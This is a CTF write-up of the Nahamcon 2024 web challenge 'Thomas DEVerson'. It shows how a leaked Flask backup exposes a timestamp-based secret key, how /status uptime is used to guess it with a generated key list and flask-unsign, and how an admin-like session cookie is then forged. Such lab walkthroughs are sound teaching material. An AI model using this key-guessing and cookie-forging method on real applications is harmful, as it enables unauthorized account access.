---
layout: load_md
title: The White Circle | Nahamcon 2024 | Thomas DEVerson Writeup
desc: "The White Circle is a community for Cyber/Information Security students, enthusiasts and professionals. You can discuss anything related to Security, share your knowledge with others, get help when you need it and proceed further in your journey with amazing people from all over the world."
image: images/twc_og_banner.jpg
ctf: Nahamcon 2024
parent: nahamcon_2024
category: web
challenge: Thomas DEVerson
tags: "web, legend, nigamelastic, twh, api, flask, flask-unsign"
date: 2024-05-28T00:00:00+00:00
last_modified_at: 2024-05-28T00:00:00+00:00
---

<h1 class="heading card-title white-text">Nahamcon 2024</h1>


## Thomas DEVerson
> Solved by : Legend, nigamelastic, thewhiteh4t


- The site has 3 endpoints `messages` `login` and `status`
- if you put any random query as post on the login u are redirect to ‘messages’ without being logged in. 
- we find another directory called `backup` which has the following content.

```
command output: {head -n 10 app.py}

from flask import (Flask, flash, redirect, render_template, request, send_from_directory, session, url_for)
from datetime import datetime

app = Flask(__name__)

c = datetime.now()
f = c.strftime("%Y%m%d%H%M")
app.secret_key = f'THE_REYNOLDS_PAMPHLET-{f}'

allowed_users = ['Jefferson', 'Madison', 'Burr'] # No Federalists Allowed!!!!

command output: {head -n 10 requirements.txt}

Flask==3.0.3
```

- All accounts show an error message on login attempts : `a``ccount is protected!`


- however the responses had some interesting cookies :

```
HTTP/1.1 302 FOUND
Server: Werkzeug/3.0.3 Python/3.8.10
Date: Thu, 23 May 2024 23:17:43 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 189
Location: /
Vary: Cookie
Set-Cookie: session=.eJwNxcENgCAMBdBV6j8zgUcdwxDTYEUTKYaWk3F3fZf3YN0vtkMM4_KA_A9FzDgLAmZWrU5XzacSG029tUCcUu3qdBrdrbokl21AfGOAchGMyF3M8X7pNCAR.Zk_Olw.CgFkkfYZmHi5O8_eaqSwj7VohO8; HttpOnly; Path=/
Connection: close

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
```

- these look like JWT but these are slightly different
- flask cookies can be decoded using `flask-unsign` tool
- for example cookies on the homepage can be decoded like this : 

```
> flask-unsign --cookie 'eyJuYW1lIjoiZ3Vlc3QifQ.ZlDcbw.D5h97i6PYmF5THUXwBgTVzPXMbU' --decode
{'name': 'guest'}
```

- although the cookie can be read but it is signed, if we want to manipulate the cookie we need a `secret key` which was used in the app to sign the new new cookie
- going back to `/backup` we can see how the app generated the secret key :

```python
c = datetime.now()
f = c.strftime("%Y%m%d%H%M")
app.secret_key = f'THE_REYNOLDS_PAMPHLET-{f}'
```

- and lets also take a look at the `/status` endpoint :

```
System healthy! Computing uptime... 82817 days 9 hours 48 minutes
```

- here the hint is that app was started once and it is running without fail
- we can roughly calculate the launch time using the following logic : 

```
launch time = current time - uptime
```

- this can easily be done using a python script but we wont get the exact time the key was generated because app launch and key generation will have different timings depending on multiple factors so we need to adjust the launch time a bit to get the exact key generation time

```
#!/usr/bin/env python3

import requests
from datetime import datetime, timedelta

base_url = 'http://challenge.nahamcon.com'
port = 30311
path = 'status'

url = f'{base_url}:{port}/{path}'
rqst = requests.get(url)

resp = rqst.text.split('\n')[1].split(' ')

days = int(resp[0])
hours = int(resp[2])
mins = int(resp[4])

uptime = timedelta(days=days, hours=hours, minutes=mins)

current_time = datetime.now()

launch_time = current_time - uptime

with open('list.txt', 'w') as outfile:
        for i in range(0, 1000):
                forward_time = launch_time - timedelta(minutes=i)
                format_time = forward_time.strftime("%Y%m%d%H%M")
                key = f'THE_REYNOLDS_PAMPHLET-{format_time}'
                outfile.write(key + '\n')
```

![](https://i.imgur.com/yPpAVlm.png)

- so now we have a list of possible keys which we can test using `flask-unsign` :


![](https://i.imgur.com/KzAzrbN.png)

- SECRET_KEY : `THE_REYNOLDS_PAMPHLET-179708250845`
- now we can easily modify the cookie and use any of the allowed usernames to read `/messages`

```
> flask-unsign --cookie "{'name': 'Burr'}" --sign --secret 'THE_REYNOLDS_PAMPHLET-179708250845'
eyJuYW1lIjoiQnVyciJ9.ZlDfmg.x3PYD73ZIkbVJhdpJ4c8UdYfGyg
```

![](https://i.imgur.com/IBfF7Bi.png)

